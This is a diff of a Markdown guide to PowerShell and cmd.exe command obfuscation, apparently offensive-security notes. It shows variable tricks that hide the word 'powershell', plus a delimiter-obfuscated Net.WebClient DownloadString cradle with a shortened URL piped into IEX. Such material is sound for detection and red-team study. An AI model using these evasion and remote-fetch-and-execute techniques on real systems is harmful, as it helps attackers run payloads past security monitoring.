@@ -378,8 +378,7 @@ The above string can be obfuscated using the **powershell special character: `**
       cmd.exe /c "set var=Get-Date&& cmd.exe /c echo %var%^" | powershell.exe
 
       [ "powershell" can be also set and called as variable in cmd.exe ]
-      cmd.exe /c "set p1=power&& set p2=shell&& cmd /c echo %p1%%p2%^" | %p1%%p2%.exe Get-Date
-
+      cmd.exe /c "set p1=power&& set p2=shell&& cmd /c echo Write -Host SUCCESS -Fore Green ^" | %p1%%p2%.exe Get-Date
 
 ![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
@@ -454,11 +453,9 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 
       $cmdWithDelim= "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t')"
-
-      [ PowerShell's .Replace ]
       IEX $cmdWithDelim.Replace("~~","") | IEX
 
-      [ .Net's-Replace  (and -CReplace which is case-sensitive replace) ]
+      [ and -CReplace which is case-sensitive replace ]
       IEX ($cmdWithDelim-Replace "~~","") | IEX
 
 
